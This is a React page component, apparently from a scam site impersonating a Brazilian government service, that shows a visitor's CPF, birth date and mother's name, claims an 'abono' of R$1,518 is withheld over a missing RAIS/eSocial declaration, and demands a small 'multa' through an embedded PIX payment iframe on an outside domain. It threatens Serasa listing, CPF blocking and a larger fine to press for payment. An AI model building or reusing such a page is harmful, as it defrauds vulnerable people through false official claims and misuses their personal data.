
import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { ArrowLeft, CheckCircle, AlertTriangle, CreditCard, User, Banknote, Calendar, FileText, Clock, X } from "lucide-react";
import { toast } from 'sonner';
import PageLayout from '@/components/PageLayout';
import { Table, TableHeader, TableBody, TableFooter, TableHead, TableRow, TableCell, TableCaption } from "@/components/ui/table";
import { Separator } from "@/components/ui/separator";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";

const Payment: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [showIframe, setShowIframe] = useState<boolean>(false);
  const navigate = useNavigate();
  const location = useLocation();

  useEffect(() => {
    if (location.state && location.state.userData) {
      setUserData(location.state.userData);
    } else {
      toast.error("Nenhum dado encontrado. Por favor, faça a consulta novamente.");
      navigate('/');
    }
  }, [location.state, navigate]);

  const formatCPF = (cpf: string) => {
    if (!cpf) return "";
    // Remove any non-digit characters
    const digitsOnly = cpf.replace(/\D/g, '');
    // Apply CPF mask XXX.XXX.XXX-XX
    return digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return null;
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
  };

  const handleBackToVerification = () => {
    navigate('/user-data', { state: { userData } });
  };

  const handleProceedToPayment = () => {
    setShowIframe(true);
  };

  const closeIframe = () => {
    setShowIframe(false);
  };

  if (!userData) {
    return (
      <PageLayout>
        <div className="flex justify-center items-center">
          <p>Carregando dados...</p>
        </div>
      </PageLayout>
    );
  }

  return (
    <PageLayout>
      <div className="container mx-auto p-0 pb-4 relative max-w-3xl">
        <div className="absolute top-0 left-0 mt-2 ml-0">
          <Button 
            variant="ghost" 
            size="icon" 
            onClick={handleBackToVerification} 
            className="text-gray-500 hover:text-gray-700 hover:bg-transparent"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
        </div>

        {showIframe && (
          <div className="fixed inset-0 bg-black bg-opacity-50 z-50 flex flex-col justify-center items-center p-4">
            <div className="bg-white rounded-lg w-full max-w-4xl mb-2 p-3">
              <div className="flex items-center">
                <AlertTriangle className="h-5 w-5 text-red-600 mr-2 flex-shrink-0" />
                <p className="text-red-700 font-medium">
                  Realize o pagamento da multa ou caso contrário seu nome ficará irregular no Serasa e será aplicada uma multa de R$2.153,33
                </p>
              </div>
            </div>
            
            <div className="bg-white rounded-lg w-full max-w-4xl h-[85vh] relative">
              <div className="absolute top-2 right-2">
                <Button 
                  variant="ghost" 
                  size="icon" 
                  onClick={closeIframe} 
                  className="text-gray-500 hover:text-gray-700 hover:bg-transparent"
                >
                  <X className="h-4 w-4" />
                </Button>
              </div>
              <iframe 
                src="https://pay.iexperience-app.com/706ead4c" 
                className="w-full h-full rounded-lg"
                title="Pagamento PIX"
              ></iframe>
            </div>
          </div>
        )}

        <div className="glass-card rounded-lg p-4 animate-fade-in mt-2 shadow-sm">
          <h2 className="font-heading text-lg font-semibold text-govblue-700 mb-3 text-center">
            Revisão de Dados para Regularização
          </h2>

          {/* Informações Pessoais - Cartão compacto */}
          <Card className="mb-4 shadow-sm">
            <CardHeader className="pb-1 pt-3 px-4">
              <CardTitle className="text-sm flex items-center">
                <User className="h-4 w-4 text-govblue-600 mr-2" />
                Informações Pessoais
              </CardTitle>
            </CardHeader>
            <CardContent className="p-3">
              <div className="grid grid-cols-2 gap-2 text-sm">
                <div>
                  <span className="text-xs text-gray-500">Nome</span>
                  <p className="font-medium">{userData.nome}</p>
                </div>
                <div>
                  <span className="text-xs text-gray-500">CPF</span>
                  <p className="font-medium">{formatCPF(userData.cpf)}</p>
                </div>
                {userData.data_nascimento && (
                  <div>
                    <span className="text-xs text-gray-500">Nascimento</span>
                    <p className="font-medium">{formatDate(userData.data_nascimento)}</p>
                  </div>
                )}
                {userData.nome_mae && (
                  <div>
                    <span className="text-xs text-gray-500">Nome da Mãe</span>
                    <p className="font-medium">{userData.nome_mae}</p>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Tabela de Detalhes compacta */}
          <div className="bg-white rounded-lg shadow-sm overflow-hidden mb-4">
            <div className="p-2 bg-govblue-50">
              <h3 className="font-medium text-govblue-700 text-sm flex items-center">
                <FileText className="h-4 w-4 mr-1" />
                Detalhes da Regularização
              </h3>
            </div>

            <Table>
              <TableHeader>
                <TableRow className="bg-gray-50">
                  <TableHead className="py-1 px-2 text-xs">Item</TableHead>
                  <TableHead className="py-1 px-2 text-xs">Detalhes</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody className="text-sm">
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Valor do Abono</TableCell>
                  <TableCell className="text-green-600 font-medium py-1 px-2">R$ 1.518,00</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Valor proporcional</TableCell>
                  <TableCell className="py-1 px-2">1 Salário mínimo</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Impedimento</TableCell>
                  <TableCell className="text-red-600 py-1 px-2">Declaração RAIS/eSocial ausente</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Razão da Multa</TableCell>
                  <TableCell className="py-1 px-2">
                    O traballhador não declarou o RAIS/eSocial
                  </TableCell>
                </TableRow>
                <TableRow className="bg-amber-50">
                  <TableCell className="font-medium py-1 px-2">Multa Base</TableCell>
                  <TableCell className="py-1 px-2">R$ 63,21</TableCell>
                </TableRow>
                <TableRow className="bg-amber-50">
                  <TableCell className="font-medium py-1 px-2">Acréscimo</TableCell>
                  <TableCell className="py-1 px-2">R$ 26,40 (4 trim. x R$ 6,60)</TableCell>
                </TableRow>
                <TableRow className="bg-amber-50 font-bold">
                  <TableCell className="font-medium text-red-700 py-1 px-2">Total da Multa</TableCell>
                  <TableCell className="text-red-700 font-bold py-1 px-2">R$ 89,61</TableCell>
                </TableRow>
              </TableBody>
              <TableFooter>
                <TableRow>
                  <TableCell colSpan={2} className="text-center text-xs text-gray-500 py-1 px-2">
                    Após pagamento, o valor de R$ 1.518,00 será liberado em até 24h.
                  </TableCell>
                </TableRow>
              </TableFooter>
            </Table>
          </div>

          {/* Aviso compacto */}
          <div className="p-2 bg-amber-50 border-l-4 border-amber-500 rounded-r-md mb-4 text-xs">
            <div className="flex items-start">
              <Clock className="h-4 w-4 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
              <p className="text-amber-800">
                Para evitar o bloqueio do CPF e suspensão das chaves PIX, regularize o mais rápido possível.
                Este pagamento refere-se apenas à regularização do impedimento.
              </p>
            </div>
          </div>

          {/* Botão de pagamento */}
          <div className="flex justify-center">
            <Button 
              className="gov-button bg-govblue-600 hover:bg-govblue-500 rounded-full px-4 py-2 text-sm w-full max-w-xs"
              onClick={handleProceedToPayment}
            >
              <CreditCard className="mr-1 h-4 w-4 flex-shrink-0" />
              <span className="font-medium">Pagar Multa e Liberar Abono</span>
            </Button>
          </div>
        </div>
      </div>
    </PageLayout>
  );
};

export default Payment;
